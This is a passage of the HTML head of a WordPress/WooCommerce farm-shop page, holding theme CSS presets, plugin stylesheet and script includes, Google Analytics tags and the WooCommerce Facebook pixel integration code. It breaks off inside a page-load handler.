var(--porto-primary-light-5);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--font-family--inter: "Inter", sans-serif;--wp--preset--font-family--cardo: Cardo;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-primary-color{color: var(--wp--preset--color--primary) !important;}.has-secondary-color{color: var(--wp--preset--color--secondary) !important;}.has-tertiary-color{color: var(--wp--preset--color--tertiary) !important;}.has-quaternary-color{color: var(--wp--preset--color--quaternary) !important;}.has-dark-color{color: var(--wp--preset--color--dark) !important;}.has-light-color{color: var(--wp--preset--color--light) !important;}.has-primary-hover-color{color: var(--wp--preset--color--primary-hover) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-primary-background-color{background-color: var(--wp--preset--color--primary) !important;}.has-secondary-background-color{background-color: var(--wp--preset--color--secondary) !important;}.has-tertiary-background-color{background-color: var(--wp--preset--color--tertiary) !important;}.has-quaternary-background-color{background-color: var(--wp--preset--color--quaternary) !important;}.has-dark-background-color{background-color: var(--wp--preset--color--dark) !important;}.has-light-background-color{background-color: var(--wp--preset--color--light) !important;}.has-primary-hover-background-color{background-color: var(--wp--preset--color--primary-hover) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-primary-border-color{border-color: var(--wp--preset--color--primary) !important;}.has-secondary-border-color{border-color: var(--wp--preset--color--secondary) !important;}.has-tertiary-border-color{border-color: var(--wp--preset--color--tertiary) !important;}.has-quaternary-border-color{border-color: var(--wp--preset--color--quaternary) !important;}.has-dark-border-color{border-color: var(--wp--preset--color--dark) !important;}.has-light-border-color{border-color: var(--wp--preset--color--light) !important;}.has-primary-hover-border-color{border-color: var(--wp--preset--color--primary-hover) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-inter-font-family{font-family: var(--wp--preset--font-family--inter) !important;}.has-cardo-font-family{font-family: var(--wp--preset--font-family--cardo) !important;}
/*# sourceURL=global-styles-inline-css */
</style>

<link rel='stylesheet' id='pi-dcw-css' href='https://www.amalfarm.com/wp-content/plugins/add-to-cart-direct-checkout-for-woocommerce/public/css/pi-dcw-public.css?ver=2.1.73.32' media='all' />
<style id="pi-dcw-inline-css">

		.pisol_buy_now_button{
			color:#ffffff !important;
			background-color: #ee6443 !important;
		}
		
/*# sourceURL=pi-dcw-inline-css */
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://www.amalfarm.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.9.8' media='all' />
<link rel='stylesheet' id='min-and-max-quantity-for-woocommerce-css' href='https://www.amalfarm.com/wp-content/plugins/min-and-max-quantity-for-woocommerce/public/css/mmqw-for-woocommerce-public.css?ver=2.0.0' media='all' />
<style id="woocommerce-inline-inline-css">
.woocommerce form .form-row .required { visibility: visible; }
/*# sourceURL=woocommerce-inline-inline-css */
</style>
<link rel='stylesheet' id='wt-smart-coupon-for-woo-css' href='https://www.amalfarm.com/wp-content/plugins/wt-smart-coupons-for-woocommerce/public/css/wt-smart-coupon-public.css?ver=1.8.5' media='all' />
<link rel='stylesheet' id='yith-wcan-shortcodes-css' href='https://www.amalfarm.com/wp-content/plugins/yith-woocommerce-ajax-navigation/assets/css/shortcodes.css?ver=5.5.0' media='all' />
<style id="yith-wcan-shortcodes-inline-css">
:root{
	--yith-wcan-filters_colors_titles: #434343;
	--yith-wcan-filters_colors_background: #FFFFFF;
	--yith-wcan-filters_colors_accent: #A7144C;
	--yith-wcan-filters_colors_accent_r: 167;
	--yith-wcan-filters_colors_accent_g: 20;
	--yith-wcan-filters_colors_accent_b: 76;
	--yith-wcan-color_swatches_border_radius: 100%;
	--yith-wcan-color_swatches_size: 30px;
	--yith-wcan-labels_style_background: #FFFFFF;
	--yith-wcan-labels_style_background_hover: #A7144C;
	--yith-wcan-labels_style_background_active: #A7144C;
	--yith-wcan-labels_style_text: #434343;
	--yith-wcan-labels_style_text_hover: #FFFFFF;
	--yith-wcan-labels_style_text_active: #FFFFFF;
	--yith-wcan-anchors_style_text: #434343;
	--yith-wcan-anchors_style_text_hover: #A7144C;
	--yith-wcan-anchors_style_text_active: #A7144C;
}
/*# sourceURL=yith-wcan-shortcodes-inline-css */
</style>
<link rel='stylesheet' id='jquery-selectBox-css' href='https://www.amalfarm.com/wp-content/plugins/yith-woocommerce-wishlist/assets/css/jquery.selectBox.css?ver=1.2.0' media='all' />
<link rel='stylesheet' id='woocommerce_prettyPhoto_css-css' href='//www.amalfarm.com/wp-content/plugins/woocommerce/assets/css/prettyPhoto.css?ver=3.1.6' media='all' />
<link rel='stylesheet' id='yith-wcwl-main-css' href='https://www.amalfarm.com/wp-content/plugins/yith-woocommerce-wishlist/assets/css/style.css?ver=4.0.1' media='all' />
<style id="yith-wcwl-main-inline-css">
 :root { --add-to-wishlist-icon-color: #222529; --added-to-wishlist-icon-color: #f4783d; --rounded-corners-radius: 16px; --add-to-cart-rounded-corners-radius: 16px; --color-headers-background: #F4F4F4; --feedback-duration: 3s } 
 :root { --add-to-wishlist-icon-color: #222529; --added-to-wishlist-icon-color: #f4783d; --rounded-corners-radius: 16px; --add-to-cart-rounded-corners-radius: 16px; --color-headers-background: #F4F4F4; --feedback-duration: 3s } 
/*# sourceURL=yith-wcwl-main-inline-css */
</style>
<link rel='stylesheet' id='porto-fs-progress-bar-css' href='https://www.amalfarm.com/wp-content/themes/porto/inc/lib/woocommerce-shipping-progress-bar/shipping-progress-bar.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='https://www.amalfarm.com/wp-content/uploads/elementor/css/custom-frontend.min.css?ver=1739896270' media='all' />
<link rel='stylesheet' id='swiper-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/lib/swiper/v8/css/swiper.min.css?ver=8.4.5' media='all' />
<link rel='stylesheet' id='e-swiper-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/css/conditionals/e-swiper.min.css?ver=3.24.7' media='all' />
<link rel='stylesheet' id='elementor-post-761-css' href='https://www.amalfarm.com/wp-content/uploads/elementor/css/post-761.css?ver=1739896270' media='all' />
<link rel='stylesheet' id='font-awesome-5-all-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.24.7' media='all' />
<link rel='stylesheet' id='font-awesome-4-shim-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.24.7' media='all' />
<link rel='stylesheet' id='widget-image-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/css/widget-image.min.css?ver=3.24.7' media='all' />
<link rel='stylesheet' id='widget-text-editor-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/css/widget-text-editor.min.css?ver=3.24.7' media='all' />
<link rel='stylesheet' id='porto-css-vars-css' href='https://www.amalfarm.com/wp-content/uploads/porto_styles/theme_css_vars.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='bootstrap-css' href='https://www.amalfarm.com/wp-content/uploads/porto_styles/bootstrap.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-plugins-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/plugins_optimized.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-theme-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-theme-member-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme_member.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-shortcodes-css' href='https://www.amalfarm.com/wp-content/uploads/porto_styles/shortcodes.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-theme-shop-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme_shop.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-theme-elementor-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme_elementor.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-theme-radius-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme_radius.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-dynamic-style-css' href='https://www.amalfarm.com/wp-content/uploads/porto_styles/dynamic_style.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-type-builder-css' href='https://www.amalfarm.com/wp-content/plugins/porto-functionality/builders/assets/type-builder.css?ver=3.3.0' media='all' />
<link rel='stylesheet' id='porto-account-login-style-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme/shop/login-style/account-login.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-theme-woopage-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme/shop/other/woopage.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-post-style-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme/blog/type/modern.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-single-post-style-css' href='https://www.amalfarm.com/wp-content/themes/porto/css/theme/blog/single-post/modern.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='elementor-post-120-css' href='https://www.amalfarm.com/wp-content/uploads/elementor/css/post-120.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='elementor-post-257-css' href='https://www.amalfarm.com/wp-content/uploads/elementor/css/post-257.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='widget-heading-css' href='https://www.amalfarm.com/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.24.7' media='all' />
<link rel='stylesheet' id='elementor-post-267-css' href='https://www.amalfarm.com/wp-content/uploads/elementor/css/post-267.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='elementor-post-230-css' href='https://www.amalfarm.com/wp-content/uploads/elementor/css/post-230.css?ver=7.3.0' media='all' />
<link rel='stylesheet' id='porto-style-css' href='https://www.amalfarm.com/wp-content/themes/porto/style.css?ver=7.3.0' media='all' />
<style id="porto-style-inline-css">
.side-header-narrow-bar-logo{max-width:180px}@media (min-width:992px){}.page-top ul.breadcrumb > li.home{display:inline-block}.page-top ul.breadcrumb > li.home a{position:relative;width:1em;text-indent:-9999px}.page-top ul.breadcrumb > li.home a:after{content:"\e883";font-family:'porto';float:left;text-indent:0}.fixed-header #header .header-top{background-color:rgb(39 162 72)}.fixed-header #header .header-main{background-color:rgba(255,255,255,0.9)}.fixed-header #header .header-top h5,#header .share-links a:not(:hover){color:#ffffff}#header .header-main .header-left,#header .header-main .header-center,#header .header-main .header-right,.fixed-header #header .header-main .header-left,.fixed-header #header .header-main .header-right,.fixed-header #header .header-main .header-center{padding-top:10px;padding-bottom:10px}.header-top .header-row{min-height:35px !important}
/*# sourceURL=porto-style-inline-css */
</style>
<link rel='stylesheet' id='styles-child-css' href='https://www.amalfarm.com/wp-content/themes/porto-child/style.css?ver=7.0' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Poppins:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic%7COpen+Sans:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic&#038;display=auto&#038;ver=7.0' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script id="jquery-core-js" src="https://www.amalfarm.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"></script>
<script id="jquery-migrate-js" src="https://www.amalfarm.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1"></script>
<script id="pi-dcw-js-extra">
var pisol_dcw_setting = {"ajax_url":"https://www.amalfarm.com/wp-admin/admin-ajax.php"};
//# sourceURL=pi-dcw-js-extra
</script>
<script id="pi-dcw-js" src="https://www.amalfarm.com/wp-content/plugins/add-to-cart-direct-checkout-for-woocommerce/public/js/pi-dcw-public.js?ver=2.1.73.32"></script>
<script id="min-and-max-quantity-for-woocommerce-js-extra">
var mmqw_plugin_vars = {"one_quantity":"Quantity: "};
//# sourceURL=min-and-max-quantity-for-woocommerce-js-extra
</script>
<script id="min-and-max-quantity-for-woocommerce-js" src="https://www.amalfarm.com/wp-content/plugins/min-and-max-quantity-for-woocommerce/public/js/mmqw-for-woocommerce-public.js?ver=2.0.0"></script>
<script data-wp-strategy="defer" id="jquery-blockui-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.7.0-wc.9.4.5"></script>
<script id="wc-add-to-cart-js-extra">
var wc_add_to_cart_params = {"ajax_url":"/wp-admin/admin-ajax.php","wc_ajax_url":"/?wc-ajax=%%endpoint%%","i18n_view_cart":"View cart","cart_url":"https://www.amalfarm.com/cart/","is_cart":"","cart_redirect_after_add":"no"};
//# sourceURL=wc-add-to-cart-js-extra
</script>
<script data-wp-strategy="defer" defer id="wc-add-to-cart-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=9.4.5"></script>
<script data-wp-strategy="defer" id="js-cookie-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4-wc.9.4.5"></script>
<script id="wt-smart-coupon-for-woo-js-extra">
var WTSmartCouponOBJ = {"ajaxurl":"https://www.amalfarm.com/wp-admin/admin-ajax.php","wc_ajax_url":"https://www.amalfarm.com/?wc-ajax=","nonces":{"public":"6d88c67965","apply_coupon":"952af0ea23"},"labels":{"please_wait":"Please wait...","choose_variation":"Please choose a variation","error":"Error !!!"},"shipping_method":[],"payment_method":"","is_cart":""};
//# sourceURL=wt-smart-coupon-for-woo-js-extra
</script>
<script id="wt-smart-coupon-for-woo-js" src="https://www.amalfarm.com/wp-content/plugins/wt-smart-coupons-for-woocommerce/public/js/wt-smart-coupon-public.js?ver=1.8.5"></script>
<script id="wc-cart-fragments-js-extra">
var wc_cart_fragments_params = {"ajax_url":"/wp-admin/admin-ajax.php","wc_ajax_url":"/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_0880871860128e951d93ab434a1d11ff","fragment_name":"wc_fragments_0880871860128e951d93ab434a1d11ff","request_timeout":"15000"};
//# sourceURL=wc-cart-fragments-js-extra
</script>
<script data-wp-strategy="defer" defer id="wc-cart-fragments-js" src="https://www.amalfarm.com/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=9.4.5"></script>

<!-- Google tag (gtag.js) snippet added by Site Kit -->

<!-- Google Analytics snippet added by Site Kit -->
<script id="google_gtagjs-js" src="https://www.googletagmanager.com/gtag/js?id=GT-NMLLVMX" async></script>
<script id="google_gtagjs-js-after">
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag("set","linker",{"domains":["www.amalfarm.com"]});
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "GT-NMLLVMX");
 window._googlesitekit = window._googlesitekit || {}; window._googlesitekit.throttledEvents = []; window._googlesitekit.gtagEvent = (name, data) => { var key = JSON.stringify( { name, data } ); if ( !! window._googlesitekit.throttledEvents[ key ] ) { return; } window._googlesitekit.throttledEvents[ key ] = true; setTimeout( () => { delete window._googlesitekit.throttledEvents[ key ]; }, 5 ); gtag( "event", name, { ...data, event_source: "site-kit" } ); } 
//# sourceURL=google_gtagjs-js-after
</script>

<!-- End Google tag (gtag.js) snippet added by Site Kit -->
<script id="font-awesome-4-shim-js" src="https://www.amalfarm.com/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.24.7"></script>
<link rel="https://api.w.org/" href="https://www.amalfarm.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.amalfarm.com/wp-json/wp/v2/posts/10127" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.amalfarm.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 7.0" />
<meta name="generator" content="WooCommerce 9.4.5" />
<link rel='shortlink' href='https://www.amalfarm.com/?p=10127' />

<link rel='stylesheet' id='5649-css' href='//www.amalfarm.com/wp-content/uploads/custom-css-js/5649.css?v=346' media='all' />
<meta name="generator" content="Site Kit by Google 1.144.0" />		<script type="text/javascript" id="webfont-queue">
		WebFontConfig = {
			google: { families: [ 'Poppins:400,500,600,700,800','Shadows+Into+Light:400,700','Roboto:400,600,700&display=swap' ] }
		};
		(function(d) {
			var wf = d.createElement('script'), s = d.scripts[d.scripts.length - 1];
			wf.src = 'https://www.amalfarm.com/wp-content/themes/porto/js/libs/webfont.js';
			wf.async = true;
			s.parentNode.insertBefore(wf, s);
		})(document);</script>
			<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
	<meta name="google-site-verification" content="G-z571wGv_3YNwTN5Xu8V0ofzzCoPskx3x4Gm8OIrJw">
<!-- Google AdSense meta tags added by Site Kit -->
<meta name="google-adsense-platform-account" content="ca-host-pub-2644536267352236">
<meta name="google-adsense-platform-domain" content="sitekit.withgoogle.com">
<!-- End Google AdSense meta tags added by Site Kit -->
			<script  type="text/javascript">
				!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
					n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
					n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
					t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
					document,'script','https://connect.facebook.net/en_US/fbevents.js');
			</script>
			<!-- WooCommerce Facebook Integration Begin -->
			<script  type="text/javascript">

				window.FacebookSignals = window.FacebookSignals || {
	_held: false,
	_queue: [],
	_config: {},
	_attribution: {},
	_seenEventIds: {},
	_fbclid: (function() {
		try {
			var m = window.location.search.match(/[?&]fbclid=([^&]*)/);
			return m ? decodeURIComponent(m[1]) : null;
		} catch(e) { return null; }
	})(),

	init: function(config) {
		config = config || {};
		this._config = config;
		this._attribution = config.attribution || {};
		this._held = !!config.held;
		this._fbclid = this._fbclid || null;

		try {
			var raw = window.sessionStorage.getItem('wc_facebook_signals_seen_event_ids');
			this._seenEventIds = raw ? JSON.parse(raw) : {};
		} catch (e) {
			this._seenEventIds = this._seenEventIds || {};
		}
	},

	queueEvent: function(eventData) {
		if (!eventData || !eventData.event_name) return;
		if (eventData.event_id && this._seenEventIds[eventData.event_id]) return;

		eventData.event_time = eventData.event_time || Math.floor(Date.now() / 1000);
		this._queue.push(eventData);

		if (eventData.event_id) {
			this._seenEventIds[eventData.event_id] = 1;
			try {
				window.sessionStorage.setItem(
					'wc_facebook_signals_seen_event_ids',
					JSON.stringify(this._seenEventIds)
				);
			} catch (e) {}
		}
	},

	trackEvent: function(name, params, userData) {
		if (this._held) {
			this.queueEvent({
				event_name: name,
				custom_data: params || {},
				user_data: userData || {},
				event_id: (params && params.eventID) || null,
				event_time: Math.floor(Date.now() / 1000)
			});
		} else {
			if (params && params.eventID) {
				fbq('track', name, params, { eventID: params.eventID });
			} else {
				fbq('track', name, params);
			}
		}
	},

	release: function() {
		var self = this;
		if (!self._held || !self._config.ajaxUrl) {
			return Promise.resolve({ success: true, data: { sent_count: 0 } });
		}

		var payload = JSON.stringify({
			security: self._config.nonce,
			events: self._queue,
			attribution: {
				fbp: self._attribution.fbp || null,
				fbc: self._attribution.fbc || null
			}
		});

		// Pass action as a query parameter so WordPress can route the request.
		var url = self._config.ajaxUrl +
			(self._config.ajaxUrl.indexOf('?') === -1 ? '?' : '&') +
			'action=' + encodeURIComponent(self._config.action);

		return new Promise(function(resolve, reject) {
			var xhr = new XMLHttpRequest();
			xhr.open('POST', url, true);
			xhr.setRequestHeader('Content-Type', 'application/json');
			xhr.onload = function() {
				if (xhr.status >= 200 && xhr.status < 300) {
						try {
							var resp = JSON.parse(xhr.responseText);
							self._handleReleaseResponse(resp.data || {});
							resolve(resp);
						} catch(e) { reject(e); }
					} else {
						reject(new Error('Signal release AJAX failed: ' + xhr.status));
					}
				};
			xhr.onerror = function() { reject(new Error('Network error')); };
			xhr.send(payload);
		});
	},

	_handleReleaseResponse: function(data) {
		this._syncAttributionCookies(data || {});

		// Re-enable the browser signal path so fbevents.js starts firing.
		fbq('consent', 'grant');

		// Replay queued events via the pixel.
		var queue = this._queue;
		for (var i = 0; i < queue.length; i++) {
			var ev = queue[i];
			if (ev.event_id) {
				fbq('track', ev.event_name, ev.custom_data || {}, { eventID: ev.event_id });
			} else {
				fbq('track', ev.event_name, ev.custom_data || {});
			}
		}

		// Clear the queue and mark signals as active again.
		this._queue = [];
		this._held = false;
	},

	_syncAttributionCookies: function(data) {
		var clientParams = {};

		if (typeof clientParamBuilder !== 'undefined') {
			try {
				// Let the client-side ParamBuilder generate/set missing attribution
				// cookies using its normal domain-scoping logic.
				clientParams = clientParamBuilder.processAndCollectParams(this._getAttributionUrl()) || {};
			} catch (e) {}
		}

		var fbp = data.fbp || clientParams._fbp || (typeof clientParamBuilder !== 'undefined' ? clientParamBuilder.getFbp() : null);
		var fbc = data.fbc || clientParams._fbc || (typeof clientParamBuilder !== 'undefined' ? clientParamBuilder.getFbc() : null);

		// If the backend supplied exact values used for CAPI, write them so Pixel
		// replay and CAPI use matching attribution.
		if (data.fbp) {
			this._setAttributionCookie('_fbp', fbp, data.fbp_domain || data.cookie_domain || this._attribution.fbpDomain);
		}
		if (data.fbc) {
			this._setAttributionCookie('_fbc', fbc, data.fbc_domain || data.cookie_domain || this._attribution.fbcDomain || this._attribution.fbpDomain);
		}
	},

	_setAttributionCookie: function(name, value, domain) {
		if (!value) return;

		var domainAttr = domain ? ';domain=' + domain : '';
		document.cookie = name + '=' + encodeURIComponent(value) + ';path=/;max-age=7776000' + domainAttr + ';SameSite=Lax';
	},

	_getAttributionUrl: function() {
		if (!this._fbclid) {
			return window.location.href;
		}

		try {
			var url = new URL(window.location.href);
			if (!url.searchParams.get('fbclid')) {
				url.searchParams.set('fbclid', this._fbclid);
			}
			return url.toString();
		} catch (e) {
			return window.location.href;
		}
	}
};
				
				fbq('init', '501581500892852', {}, {
    "agent": "woocommerce_0-9.4.5-3.7.0"
});

								FacebookSignals.init({ held: false });
				
				document.addEventListener( 'DOMContentLoaded', function() {
					// Insert placeholder for events injected when a product is added to the cart through AJAX.
